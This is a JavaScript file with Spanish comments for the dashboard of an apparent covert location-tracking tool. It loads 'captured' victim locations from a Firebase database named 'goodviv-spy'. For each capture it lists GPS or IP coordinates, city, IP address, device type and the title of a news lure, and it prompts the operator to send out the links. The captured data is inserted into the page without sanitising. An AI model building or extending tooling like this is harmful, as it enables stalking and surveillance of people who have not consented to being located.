// Script para integrar base de datos compartida en el centro de control
function initSharedDatabase() {
    // Sobrescribir función refreshCaptures para usar base de datos compartida
    window.originalRefreshCaptures = window.refreshCaptures;
    
    window.refreshCaptures = function() {
        const container = document.getElementById('capturedList');
        container.innerHTML = '<p style="color: #95a5a6; text-align: center; padding: 20px;">🔄 Cargando ubicaciones compartidas...</p>';
        
        // Cargar desde Firebase
        fetch('https://goodviv-spy-default-rtdb.firebaseio.com/locations.json', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            },
            cache: 'no-store' // Deshabilitar caché para obtener siempre datos frescos
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Error de red: ' + response.status);
            }
            return response.json();
        })
        .then(data => {
            // Convertir el objeto de Firebase en un array y filtrar valores nulos
            const sharedLocations = data ? Object.values(data).filter(item => item !== null) : [];
            console.log('🔥 Datos de Firebase:', sharedLocations.length);
            
            const localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
            console.log('💻 Datos locales:', localLocations.length);
            
            // Combinar y eliminar duplicados
            const allLocations = [...sharedLocations, ...localLocations];
            const uniqueLocations = allLocations.filter((location, index, self) => 
                index === self.findIndex(l => l.id === location.id)
            );
            
            // Ordenar por timestamp más reciente
            uniqueLocations.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            console.log('📍 Ubicaciones compartidas encontradas:', uniqueLocations.length);
            
            if (uniqueLocations.length === 0) {
                container.innerHTML = '<p style="color: #95a5a6; text-align: center; padding: 20px;">No hay capturas aún... ¡Envía los enlaces!</p>';
                return;
            }
            
            container.innerHTML = uniqueLocations.map(location => {
                // Compatibilidad con diferentes formatos de datos
                const lat = location.latitude || location.lat;
                const lng = location.longitude || location.lng;
                const accuracy = location.accuracy || 0;
                const method = location.method || 'UNKNOWN';
                
                // Determinar el icono y nombre según el método
                let methodIcon = '❓';
                let methodName = 'Fuente desconocida';
                
                if (method === 'IP_AUTOMATIC') {
                    methodIcon = '�';
                    methodName = 'Ubicación IP';
                } else if (method === 'GPS_PRECISION') {
                    methodIcon = '�🎯';
                    methodName = 'GPS Preciso';
                } else if (location.source) {
                    methodIcon = '🎯';
                    methodName = location.source;
                }
                
                // Validar que las coordenadas sean válidas
                const coordsValid = lat && lng && lat !== 0 && lng !== 0;
                
                return `
                <div class="location-item">
                    <div class="location-header">${methodIcon} ${methodName}</div>
                    <div class="location-details">
                        📍 <strong>Coordenadas:</strong> ${coordsValid ? `${lat.toFixed(6)}, ${lng.toFixed(6)}` : 'N/A, N/A'}<br>
                        🎯 <strong>Precisión:</strong> ${method === 'IP_AUTOMATIC' ? 'City-level (~5-50km)' : `±${Math.round(accuracy)}m`}<br>
                        ⏰ <strong>Capturado:</strong> ${new Date(location.timestamp).toLocaleString()}<br>
                        🌐 <strong>Dispositivo:</strong> ${(location.userAgent && location.userAgent.includes('Mobile')) ? '📱 Móvil' : '💻 PC'}<br>
                        ${location.city ? `🏙️ <strong>Ciudad:</strong> ${location.city}` : ''}
                        ${location.region ? `, ${location.region}` : ''}
                        ${location.country ? `, ${location.country}` : ''}<br>
                        ${location.ip ? `🌐 <strong>IP:</strong> ${location.ip}<br>` : ''}
                        ${location.newsTitle ? `📰 <strong>Noticia:</strong> ${location.newsTitle.substring(0, 50)}...` : ''}
                        <div style="margin-top: 10px;">
                            <button onclick="openInGoogleMaps(${lat || 0}, ${lng || 0})" style="background: #3498db; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; margin-right: 5px; font-size: 0.8rem;" ${!coordsValid ? 'disabled' : ''}>
                                🗺️ Ver en Mapa
                            </button>
                            <button onclick="copyToClipboard('${coordsValid ? `${lat.toFixed(6)}, ${lng.toFixed(6)}` : 'N/A'}')" style="background: #27ae60; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; font-size: 0.8rem;" ${!coordsValid ? 'disabled' : ''}>
                                📋 Copiar Coordenadas
                            </button>
                        </div>
                    </div>
                </div>
                `;
            }).join('');
            
            // Actualizar estadísticas con datos compartidos
            updateStatsWithSharedData(uniqueLocations);
        })
        .catch(error => {
            console.error('Error cargando base de datos compartida:', error);
            container.innerHTML = '<p style="color: #e74c3c; text-align: center; padding: 20px;">❌ Error cargando ubicaciones compartidas. Usando datos locales...</p>';
            // Usar función original si falla
            if (window.originalRefreshCaptures) {
                window.originalRefreshCaptures();
            }
        });
    };
    
    // Función para actualizar estadísticas con datos compartidos
    window.updateStatsWithSharedData = function(locations) {
        // Separar por método de captura
        const gpsCaptures = locations.filter(loc => loc.method === 'GPS_PRECISION');
        const ipCaptures = locations.filter(loc => loc.method === 'IP_AUTOMATIC');
        const otherCaptures = locations.filter(loc => !loc.method || (loc.method !== 'GPS_PRECISION' && loc.method !== 'IP_AUTOMATIC'));
        
        // Total capturas con desglose
        const totalText = `${locations.length} (🌐 ${ipCaptures.length} IP + 🎯 ${gpsCaptures.length} GPS${otherCaptures.length > 0 ? ` + ${otherCaptures.length} Otras` : ''})`;
        document.getElementById('totalCaptures').textContent = totalText;
        
        // Capturas hoy
        const today = new Date().toDateString();
        const todayGPS = gpsCaptures.filter(loc => 
            new Date(loc.timestamp).toDateString() === today
        ).length;
        const todayIP = ipCaptures.filter(loc => 
            new Date(loc.timestamp).toDateString() === today
        ).length;
        const todayOthers = otherCaptures.filter(loc => 
            new Date(loc.timestamp).toDateString() === today
        ).length;
        
        const todayText = `${todayGPS + todayIP + todayOthers} (🌐 ${todayIP} IP + 🎯 ${todayGPS} GPS${todayOthers > 0 ? ` + ${todayOthers} Otras` : ''})`;
        document.getElementById('todayCaptures').textContent = todayText;
        
        // Precisión promedio (solo para GPS)
        if (gpsCaptures.length > 0) {
            const avgAccuracy = gpsCaptures.reduce((sum, loc) => {
                const acc = parseFloat(loc.accuracy) || 0;
                return sum + acc;
            }, 0) / gpsCaptures.length;
            const precisionText = `${Math.round(avgAccuracy)}m GPS (${gpsCaptures.length} muestras)`;
            document.getElementById('averageAccuracy').textContent = precisionText;
        } else {
            document.getElementById('averageAccuracy').textContent = 'Solo capturas IP (ciudad)';
        }
        
        // Estrategia híbrida
        const strategyText = ipCaptures.length > 0 && gpsCaptures.length > 0 
            ? '🚀 Híbrida (IP + GPS)' 
            : ipCaptures.length > 0 
                ? '🌐 Solo IP Automática'
                : gpsCaptures.length > 0
                    ? '🎯 Solo GPS Manual'
                    : '❓ Datos Mixtos';
        
        document.getElementById('bestStrategy').textContent = strategyText;
    };
}

// Inicializar cuando se carga la página
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initSharedDatabase);
} else {
    initSharedDatabase();
}